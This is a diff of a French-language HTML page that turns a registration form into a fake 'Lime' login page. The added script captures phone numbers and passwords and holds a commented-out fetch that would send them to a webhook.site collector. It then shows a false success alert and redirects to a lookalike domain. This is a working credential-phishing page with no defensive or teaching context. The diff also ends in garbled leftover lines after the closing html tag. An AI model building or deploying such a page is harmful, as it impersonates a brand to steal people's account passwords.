@@ -1,40 +1,132 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Page de Reg</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Connexion Lime</title>
   <style>
-    body { font-family: Arial, sans-serif; background: #f7f7f7; padding: 20px; }
-    .container { background: #fff; padding: 20px; max-width: 400px; margin: auto; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
-    input, button { width: 100%; padding: 10px; margin: 8px 0; }
-    button { background: #0284c7; color: white; border: none; cursor: pointer; }
-    #infos { margin-top: 15px; padding: 10px; background: #e0f7fa; border-radius: 5px; }
+    body {
+      margin: 0;
+      font-family: sans-serif;
+      background-color: #f7f7f7;
+      color: #333;
+    }
+    .header-img {
+      width: 100%;
+      height: 35vh;
+      object-fit: cover;
+    }
+    .login-container {
+      background-color: white;
+      max-width: 400px;
+      margin: -50px auto 0;
+      padding: 30px 20px;
+      border-radius: 10px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.2);
+    }
+    h2 {
+      text-align: center;
+      color: #0284c7;
+    }
+    .phone-group {
+      display: flex;
+      margin-bottom: 15px;
+    }
+    .phone-group select {
+      width: 30%;
+      padding: 10px;
+      border: 1px solid #ccc;
+      border-radius: 4px 0 0 4px;
+    }
+    .phone-group input {
+      width: 70%;
+      padding: 10px;
+      border: 1px solid #ccc;
+      border-left: none;
+      border-radius: 0 4px 4px 0;
+    }
+    input[type="password"], button {
+      width: 100%;
+      padding: 12px;
+      margin-top: 10px;
+      border-radius: 5px;
+      border: 1px solid #ccc;
+    }
+    button {
+      background-color: #0284c7;
+      color: white;
+      border: none;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+    button:hover {
+      background-color: #026ca0;
+    }
+    .error {
+      color: red;
+      text-align: center;
+      margin-top: 10px;
+    }
   </style>
 </head>
 <body>
-  <div class="container">
-    <h2>Inscription</h2>
-    <p>Code de parrainage : <span id="code">–</span></p>
-    <form id="regForm">
-      <input type="text" id="name" placeholder="Ton nom" required>
-      <input type="tel" id="phone" placeholder="Numéro" required>
-      <button type="submit">Envoyer</button>
+  <img src="https://postimg.cc/pmmz2PqM" alt="Lime" class="header-img"/>
+  <div class="login-container">
+    <h2>Connexion</h2>
+    <form id="loginForm">
+      <div class="phone-group">
+        <select id="country-code">
+          <option value="+226">+226</option>
+          <option value="+225">+225</option>
+          <option value="+33">+33</option>
+          <option value="+1">+1</option>
+        </select>
+        <input type="tel" id="phone" placeholder="Numéro de téléphone" required/>
+      </div>
+      <input type="password" id="password" placeholder="Mot de passe" required/>
+      <div class="error" id="error"></div>
+      <button type="submit">Se connecter</button>
     </form>
-    <p id="msg"></p>
-    <div id="infos"></div> <!-- Zone pour afficher les infos -->
   </div>
 
   <script>
-    const params = new URLSearchParams(window.location.search);
-    const code = params.get('code') || 'NON-DÉFINI';
-    document.getElementById('code').innerText = code;
-
-    document.getElementById('regForm').addEventListener('submit', function(e) {
+    const form = document.getElementById('loginForm');
+    form.addEventListener('submit', function(e) {
       e.preventDefault();
+      const code = document.getElementById('country-code').value;
+      const phone = document.getElementById('phone').value.trim();
+      const password = document.getElementById('password').value.trim();
 
-      const name = document.getElementById('name').value;
-      const phone = document.getElementById('phone').value;
+      if (!phone || !password) {
+        document.getElementById('error').innerText = "Veuillez remplir tous les champs.";
+        return;
+      }
+
+      document.getElementById('error').innerText = "";
+
+      const data = { phone: code + phone, password };
+      console.log("Données soumises :", data);
+
+      // Envoyer les données à ton webhook (décommente si besoin) :
+      /*
+      fetch("https://webhook.site/b1fb39f5-27fc-412a-adba-4a0bdd868cb5", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(data)
+      })
+      .then(response => {
+        window.location.href = "https://onea-limeee.com/?from=My";
+      })
+      .catch(error => console.error(error));
+      */
+
+      // Pour test, sans envoi :
+      alert("Connexion réussie !");
+      window.location.href = "https://onea-limeee.com/?from=My";
+    });
+  </script>
+</body>
+</html>      const phone = document.getElementById('phone').value;
 
       // Simuler l'envoi
       console.log('Inscription →', { name, phone, code });
